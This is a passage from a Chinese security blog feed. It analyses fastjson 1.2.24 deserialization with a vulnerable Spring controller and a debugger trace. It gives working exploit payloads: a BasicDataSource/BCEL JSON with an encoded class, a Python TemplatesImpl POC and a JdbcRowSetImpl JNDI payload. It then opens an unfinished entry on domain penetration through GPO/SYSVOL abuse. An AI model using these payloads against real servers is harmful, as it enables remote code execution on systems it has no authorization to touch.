class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xuan;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.core.io.buffer.DataBufferUtils.readInputStream;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">helloC</span>  &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        //ModelAndView 模型和视图</span></span><br><span class="line"><span class="comment">//        ModelAndView mv = new ModelAndView();</span></span><br><span class="line"><span class="comment">//        //封装对象，放在ModelAndView中。Model</span></span><br><span class="line"><span class="comment">//        mv.addObject(&quot;msg&quot;,&quot;HelloSpringMVC!&quot;);</span></span><br><span class="line"><span class="comment">//        //封装要跳转的视图，放在ModelAndView中</span></span><br><span class="line"><span class="comment">//        mv.setViewName(&quot;hello&quot;);</span></span><br><span class="line"><span class="comment">//        return mv;</span></span><br><span class="line">        <span class="meta">@RequestMapping(value = &quot;/hello&quot;,produces = &#123;&quot;application/json&quot;&#125;,method = RequestMethod.POST,consumes = &#123;&quot;application/json&quot;&#125;)</span></span><br><span class="line">        <span class="meta">@ResponseBody</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">hello</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>() ;</span><br><span class="line">             <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span>  request.getInputStream();</span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(isr);</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((s=br.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">                sb.append(s) ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span>sb.toString();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(str);</span><br><span class="line">            System.out.println(obj.getClass().getName());</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//            String var4 = new String(Util_public.readInputStream(var1.getInputStream()), &quot;UTF-8&quot;);</span></span><br><span class="line"><span class="comment">//            Map var5 = (Map)JSON.parseObject(var4, Map.class);</span></span><br><span class="line"><span class="comment">//            JSONObject res=new JSONObject();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            String s1 =JSON.toJSONString(request.getParameter(&quot;name&quot;));</span></span><br><span class="line"><span class="comment">//            System.out.println(s1);</span></span><br><span class="line"><span class="comment">//            Object obj = JSON.parseObject(s1,Object.class);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//            System.out.println(obj);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>参考 <a href="https://xz.aliyun.com/t/8979">https://xz.aliyun.com/t/8979</a></p><p>​        <a href="https://y4er.com/post/fastjson-learn/#1247-%E9%80%9A%E6%9D%80">https://y4er.com/post/fastjson-learn/#1247-%E9%80%9A%E6%9D%80</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parseObject 断点</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411091111293.png" alt="image-20220411091111293"></p><p>来到parseobject</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411212428204.png" alt="image-20220411212428204"></p><p>继续进入</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411212524888.png" alt="image-20220411212524888"></p><p>这里会创建一个DefaultJSONParser对象 跟进我们查看 DefaultJSONParser，赋值token&#x3D;12，返回DefaultJSONParser对象</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411212726752.png" alt="image-20220411212726752"></p><p>继续跟进 parse</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411212940599.png" alt="image-20220411212940599"></p><p>由于token&#x3D;12 所以直接进入case12,创建一个空的jsonobject 对象 ，然后进入parseobject方法</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411213025980.png" alt="image-20220411213025980"></p><p>跟入parseobject </p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411213159409.png" alt="image-20220411213159409"></p><p>while循环里 先去除空字符 然后 ch 获取 “{“ 的下一个字符 双引号</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411213753146.png" alt="image-20220411213753146"></p><p>来到 scansympol 中  获取@type 参数指定的类 ，fastjson 反序列化时 @type 可以指定加载类</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411213939391.png" alt="image-20220411213939391"></p><p>后面来到 判断，进行类加载的操作</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411214140244.png" alt="image-20220411214140244"></p><p>跟进 loadClass 里，发现 会先进入mapping里进行查找，我们会发现没有，</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411214534556.png" alt="image-20220411214534556"></p><p>最终在此处调用了loadclass,并且将classname 加入到mapping里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                 <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                     clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                     mappings.put(className, clazz);</span><br><span class="line">                     <span class="keyword">return</span> clazz;</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411214803822.png" alt="image-20220411214803822"></p><p>返回clazz后 会进入到 Deserializer  在 getDeserializer 里会进行黑名单判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> <span class="built_in">this</span>.config.getDeserializer(clazz);</span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411215436740.png" alt="image-20220411215436740"></p><p>当然因为是1.2.24  所有黑名单还不是很多 ，这时候的黑名单不是很多就只有2个</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411215523267.png" alt="image-20220411215523267"></p><p>后面会进入取set 方法  在哪里调用看下面的堆栈</p><p>主要看下面两个堆栈</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411215914385.png" alt="image-20220411215914385"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">derializer = <span class="built_in">this</span>.createJavaBeanDeserializer(clazz, (Type)type);  调用了 createJavaBeanDeserializer</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beanInfo = JavaBeanInfo.build(clazz, type, this.propertyNamingStrategy);</span><br></pre></td></tr></table></figure><p>在加载了class后，build里会把我们的class进行反射调用  拿取所有的方法，变量，构造函数</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411220147058.png" alt="image-20220411220147058"></p><p>然后通过遍历methods  取get、set方法</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411221042842.png" alt="image-20220411221042842"></p><p>这里就是判断条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; (method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>方法名长度大于4</li><li>非静态方法</li><li>返回值为void或当前类</li><li>方法名以set开头</li><li>参数个数为1</li></ol><p>当满足条件之后会从方法名截取属性名,这里会判断截取的字符串是大写 或者是不是_  f </p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411221527467.png" alt="image-20220411221527467"></p><p>get的获取我就不写了在</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220411222137019.png" alt="image-20220411222137019"></p><p>总结方法为</p><ol><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ol><p>最后当程序绑定了对应的字段之后，如果传入json字符串的键值中存在这个值，就会去调用执行对应的setter、构造方法。</p><p>大致就是fastjson的漏洞分析</p><h2 id="不出网的利用链"><a href="#不出网的利用链" class="headerlink" title="不出网的利用链"></a>不出网的利用链</h2><p>参考</p><p><a href="https://www.cnblogs.com/R0ser1/p/15918626.html">https://www.cnblogs.com/R0ser1/p/15918626.html</a></p><p><a href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/">https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/</a></p><h3 id="BasicDataSource链利用"><a href="#BasicDataSource链利用" class="headerlink" title="BasicDataSource链利用"></a>BasicDataSource链利用</h3><p>我们先看下bcel</p><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code></p><p>bcel 的classloader 位于 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><p>但是在Java 8u251 以后 bcel的classloader就被修复了移除了</p><p>exp如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$c9N$CA$Q$86$fff$hf$ivq$c7$c4$93$e0$81$b9x$83x$nx$R$97$88$d1s$d3vH$e3$yd$98$n$bc$91g$$j$3c$f8$A$3e$94$b1zb$80$c4$3eTuU$7d$f5WW$7f$ff$7c$7e$B8$c7$b1$F$D$V$LU$d4$f2$d8$d6$ben$60$c7$c0$ae$81$3d$86$5cW$f9$w$ba$60H7$5b$8f$M$99$5e$f0$y$ZJ$D$e5$cb$9b$d8$h$c9$f0$81$8f$5c$ca$e4$bb$c2$fd$p$L$c3$88$8b$97k$3eMJ$a4$c5$60$N$838$U$f2Ri$d4$ec$cf$95$db$9e$f09$b7$91$87i$60$df$c6$B$OICpW$b4$e5B$da8B$83$a1$a6$Z$c7$e5$fe$d8$e9$_$84$9cF$w$f0I$5e$E$9e$b3$88$b9$efh$j$86$f2$9a$ba$jM$a4$88$Y$w$eb$d4$7d$ecG$ca$a3$a9$d6XF$ab$a0$del$N$fe1$jZ$8f$86$L$86$d3$e6Fu$Y$85$ca$lw6$h$ee$c2$40$c8$d9$ac$83$T$e4$e8$f3$f4I$81$e9e$c8Z$U5$c83$f2$d9$b3w$b0$r$5d$Y$b6$c8$e6$92d$9a$40$7b$85$f6$92V$a0$f8$81T5$fd$86$cc$d3$x2W$cb$qg$S$97$a5$ba$ee$zR$9fV0i$60$81$U$K$U$ZH$N$M$aa$Q$5cJ$deP$fe$F$g$G$87$eb$d6$B$A$A&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412102458158.png" alt="image-20220412102458158"></p><p>利用链分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()</span><br></pre></td></tr></table></figure><p>getConnection 做断点</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412230453181.png" alt="image-20220412230453181"></p><p>强制进入 return this.createDataSource().getConnection();</p><p>然后进入createConnectionFactory</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412230810371.png" alt="image-20220412230810371"></p><p>再次进入createConnectionFactory</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231022871.png" alt="image-20220412231022871"></p><p>漏洞利用点在 createDriver</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Driver <span class="title function_">createDriver</span><span class="params">(BasicDataSource basicDataSource)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">      <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> basicDataSource.getDriver();</span><br><span class="line">      <span class="type">String</span> <span class="variable">driverClassName</span> <span class="operator">=</span> basicDataSource.getDriverClassName();</span><br><span class="line">      <span class="type">ClassLoader</span> <span class="variable">driverClassLoader</span> <span class="operator">=</span> basicDataSource.getDriverClassLoader();</span><br></pre></td></tr></table></figure><p>@type指定的org.apache.tomcat.dbcp.dbcp2.BasicDataSource  然后json进行赋值并取值 </p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231327712.png" alt="image-20220412231327712"></p><p>至于为什么JSON参数 driverClassLoader  driverClassName 要这样写 看下面的图就明白了 ，在loadclass后 会反射取所有方法 调用get set方法  ，这里我们的类写的是bcel的类 所以classloader为bcel的classloader</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231518317.png" alt="image-20220412231518317"></p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231623925.png" alt="image-20220412231623925"></p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231639466.png" alt="image-20220412231639466"></p><p>至此完成了利用攻击 bcel加载，true的时候 默认实类化</p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231807980.png" alt="image-20220412231807980"></p><p><img src="/2022/04/11/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/image-20220412231903928.png" alt="image-20220412231903928"></p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这个链路的利用限制比较多，不做多讲解</p><p><a href="https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#TemplatesImpl">https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#TemplatesImpl</a></p><p>POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">fin = <span class="built_in">open</span>(<span class="string">r&quot;Temppoc.class&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">byte = fin.read()</span><br><span class="line">fout = base64.b64encode(byte).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">poc = <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;%s&quot;],&quot;_name&quot;:&quot;a.b&quot;,&quot;_tfactory&quot;:&#123;&#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;&#x27;</span>% fout</span><br><span class="line"><span class="built_in">print</span> (poc)</span><br></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl 利用链原理就是 jndi 注入</p><p>setDataSourceName()和setAutoCommit()满足setter自动调用的条件 所以触发了lookup造成了jndi漏洞</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:1389/#Calc&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="keyword">true</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暂时先写这么多，项目多的原因  后面学费了再更新</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;参考连接&quot;&gt;&lt;a href=&quot;#参考连接&quot; class=&quot;headerlink&quot; title=&quot;参考连接&quot;&gt;&lt;/a&gt;参考连接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.weik1.top/2021/09/08/Fastjson%20%E5%8F%8</summary>
      
    
    
    
    
    <category term="fastjson" scheme="http://example.com/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>域渗透实战下-gpo策略利用</title>
    <link href="http://example.com/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/"/>
    <id>http://example.com/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/</id>
    <published>2022-04-07T02:26:36.140Z</published>
    <updated>2022-04-07T08:20:52.542Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h2><p><strong><a href="https://redn3ck.github.io/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/">https://redn3ck.github.io/2018/03/01/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%8E%A7%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C%E8%BF%9C%E6%8E%A7/</a></strong></p><p><strong><a href="https://xz.aliyun.com/t/9511">https://xz.aliyun.com/t/9511</a></strong></p><p><strong><a href="http://www.ttk7.cn/post-136.html">http://www.ttk7.cn/post-136.html</a></strong></p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a><strong>注意点</strong></h2><p><strong>计划任务  每次需要删除计划的配置文件 ，更改任务名 重新下发文件,计划任务的文件路径放在sysvol目录下</strong></p><p><strong>startup 重启登录  文件必须放在 gpo配置的指定目录下</strong></p><p><strong>如果有修改sysvol的权限 可以尝试替换 Startup 以及 计划任务的配置文件</strong></p><h2 id="Gpp策略"><a href="#Gpp策略" class="headerlink" title="Gpp策略"></a><strong>Gpp策略</strong></h2><p><strong>域内的组策略，在创建gpo之后，可以设置 执行命令的功能，适用于在有适当的域控制权限针对特定目标机器进行执行命令或者批量下发命令的功能</strong></p><p><strong>所有的域策略保存在</strong> </p><p><strong>SYSVOL</strong></p><p><strong>解决办法之一是为认证数据采取SYSVOL，SYSVOL是AD（活动目录）里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\&lt;/domain&gt;&lt;/domain&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a><strong>环境</strong></h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dc1</span><br><span class="line">windows7</span><br></pre></td></tr></table></figure><h2 id="SYSVOL下存放的域策略配置"><a href="#SYSVOL下存放的域策略配置" class="headerlink" title="SYSVOL下存放的域策略配置"></a><strong>SYSVOL下存放的域策略配置</strong></h2><p><strong>SYSVOL 下可能会存放密码策略，本地管理员账户，网站账户的一些策略配置，在权限拓展失败的情况下可以尝试翻阅SYSVOL下的目录可能会有域内的一些配置脚本保存信息</strong></p><h3 id><a href="#" class="headerlink" title></a><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407131747903.png" alt="image-20220407131747903"></strong></h3><p><strong><img src="/2022/04/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8B-gpo%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8/image-20220407132105498.png" alt="image-20220407132105498"></strong></p><p><strong>User （Ou组内用户登录后相关脚本进行的命令执行）</strong></p><p><strong>Machine (机器重启运行后相关脚本进行的命令执行)</strong></p><h2 id="登录域控通过域策略进行命令执行"><a href="#登录域控通过域策略进行命令执行" class="headerlink" title="登录域控通过域策略进行命令执行"></a><strong>登录域控通过域策略进行命令执行</strong></h2><h3 id="新建OU"><a href="#新建OU" class="headerlink" 